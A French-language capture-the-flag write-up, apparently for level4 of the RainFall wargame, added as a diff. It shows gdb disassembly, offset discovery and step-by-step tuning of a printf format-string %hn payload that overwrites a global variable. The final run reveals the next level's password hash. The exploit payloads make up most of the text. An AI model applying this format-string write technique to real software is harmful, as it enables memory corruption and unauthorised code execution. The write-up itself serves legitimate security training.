@@ -1,0 +1,115 @@
+On doit mettre "m" a la valeur 0x1025544. Pour cela on va exploiter printf(buff)
+en utilisant la tchnique d'ecriture a une adresse avec les %hn. Pour cela on ouvre gdb:
+$ bash | gdb ./level4
+(gdb) echo disas n
+level4@RainFall:~$ Dump of assembler code for function n:
+   0x08048457 <+0>:		push   %ebp
+   0x08048458 <+1>:		mov    %esp,%ebp
+   0x0804845a <+3>:		sub    $0x218,%esp
+   0x08048460 <+9>:		mov    0x8049804,%eax
+   0x08048465 <+14>:	mov    %eax,0x8(%esp)
+   0x08048469 <+18>:	movl   $0x200,0x4(%esp)
+   0x08048471 <+26>:	lea    -0x208(%ebp),%eax
+   0x08048477 <+32>:	mov    %eax,(%esp)
+   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
+   0x0804847f <+40>:	lea    -0x208(%ebp),%eax
+   0x08048485 <+46>:	mov    %eax,(%esp)
+   0x08048488 <+49>:	call   0x8048444 <p>
+   0x0804848d <+54>:	mov    0x8049810,%eax
+   0x08048492 <+59>:	cmp    $0x1025544,%eax
+   0x08048497 <+64>:	jne    0x80484a5 <n+78>
+   0x08048499 <+66>:	movl   $0x8048590,(%esp)
+   0x080484a0 <+73>:	call   0x8048360 <system@plt>
+   0x080484a5 <+78>:	leave
+   0x080484a6 <+79>:	ret
+End of assembler dump.
+---------> On s'arrete a la comparaison pour voir a quoi est egal 'm' apres le printf:
+(gdb) echo b *0x08048492
+---------> Maintenant on check l'offset de argv[1]:
+(gdb) echo r
+python -c 'print "AAAA" + "..%p"*100'
+AAAA..0xb7ff26b0..0xbffff764..0xb7fd0ff4..(nil)..(nil)..0xbffff728..0x804848d..0xbffff520..0x200..0xb7fd1ac0..0xb7ff37d0..0x41414141..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e
+
+level4@RainFall:~$ Breakpoint 1, 0x08048492 in n ()
+---------> on remarque que notre "AAAA" alias 0x41414141 se trouve 12 adresses plus loin
+---------> On va donc ecrire a ladresse de "m" (0x08049810) la valeur 0x1025544
+(gdb) echo r
+python -c 'print "\x08\x04\x98\x10"[::-1] + "%12$n"'
+�
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) level4@RainFall:~$ echo x m
+level4@RainFall:~$    0x4:	  Cannot access memory at address 0x4
+---------> On a bien ecrit a ladresse 0x08049810 la valeur 0x4, la longueur de notre adresse.
+---------> On a ecrit 0x4 sur 4 octets, on va essayer sur 2 octets avec $hn.
+---------> Essayons maintenant d'ecrire 0x5544 soit en decimal 21828 avec %x:
+(gdb) echo r
+python -c 'print "\x08\x04\x98\x10"[::-1] + "%21828x%12$hn"'
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) echo x m
+level4@RainFall:~$    0x5548:	Cannot access memory at address 0x5548
+--------> On a reussi a ecrire 0x5544 + les 0x4 de l'adresse
+--------> Donc en enlevant 4 a 21828 on arrivera normalement a 0x5544
+(gdb) echo r
+python -c 'print "\x08\x04\x98\x10"[::-1] + "%21824x%12$hn"'
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) echo x m
+level4@RainFall:~$    0x5544:   Cannot access memory at address 0x5544
+--------> On y est.
+--------> Maintenant il nous reste plus qu'a ecrire 0x102 avant.
+--------> Pour cela on ajoute l'adresse de "m" + 2 (vu que %hn ecrit sur 2 octets)
+--------> puis on ecrit 0x102 soit 258 a cette adresse:
+(gdb) echo r
+python -c 'print "\x08\x04\x98\x10"[::-1] + "\x08\x04\x98\x12"[::-1] + "%21824x%12$hn%258x%13$hn"'
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) echo x m
+   0x564a5548:	Cannot access memory at address 0x564a5548
+--------> Ah. On a ecrit beaucoup plus que 0x102 et c'est logique
+--------> Du coup comme 0x102 est plus petit que 0x5544, on va devoir surement ecrire d'abord les 0x102 caracteres, puis les 0x5544.
+--------> Pour cela, on va interchanger les 2 adresses et les %hn:
+(gdb) echo r
+python -c 'print "\x08\x04\x98\x12"[::-1] + "\x08\x04\x98\x10"[::-1] + "%258x%12$hn%21824x%13$hn"'
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) echo x m
+   0x10a564a:	Cannot access memory at address 0x10a564a
+--------> Ca ressemble deja plus a ce qu'on veut faire. On a 0x10a au debut et 0x564a ensuite
+--------> Faisons un peu de maths:
+--------> Si on retire les 4 octets de ladresse au debut puis les 0x102 caracteres a la fin on devrait
+--------> pouvoir arriver a nos fins:
+(gdb) echo r
+python -c 'print "\x08\x04\x98\x12"[::-1] + "\x08\x04\x98\x10"[::-1] + "%254x%12$hn%21722x%13$hn"'
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) level4@RainFall:~$ echo x m
+   0x10655e0:			 Cannot access memory at address 0x10655e0
+--------> Il va falloir encore en enlever 4 au debut puis e0 - 44 = ec (soit 236) au second:
+(gdb) echo r
+python -c 'print "\x08\x04\x98\x12"[::-1] + "\x08\x04\x98\x10"[::-1] + "%250x%12$hn%21486x%13$hn"'
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) echo x m
+   0x10254f0:	Cannot access memory at address 0x10254f0
+-------> On a bien 0x102 au debut mais la fin est maintenant trop petite.
+-------> il faudrait ajouter 0x5544 - 0x54f0 = 54 soit 84 octets a la fin:
+(gdb ) echo r
+python -c 'print "\x08\x04\x98\x12"[::-1] + "\x08\x04\x98\x10"[::-1] + "%250x%12$hn%21570x%13$hn"'
+
+Breakpoint 1, 0x08048492 in n ()
+(gdb) echo x m
+   0x1025544:	Cannot access memory at address 0x1025544
+-------> EEEET bingo !
+-------> <m> vaut bien 0x1025544 maintenant essayons ca sans gdb:
+
+level4@RainFall:~$ python -c 'print "AAAA" + "..%p"*100' | ./level4
+AAAA..0xb7ff26b0..0xbffff794..0xb7fd0ff4..(nil)..(nil)..0xbffff758..0x804848d..0xbffff550..0x200..0xb7fd1ac0..0xb7ff37d0..0x41414141..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e..0x70252e2e
+
+---------> l'offset est toujours de 12:
+level4@RainFall:~$ python -c 'print "\x08\x04\x98\x12"[::-1] + "\x08\x04\x98\x10"[::-1] + "%250x%12$hn%21570x%13$hn"' | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+level4@RainFall:~$
+
+easy money
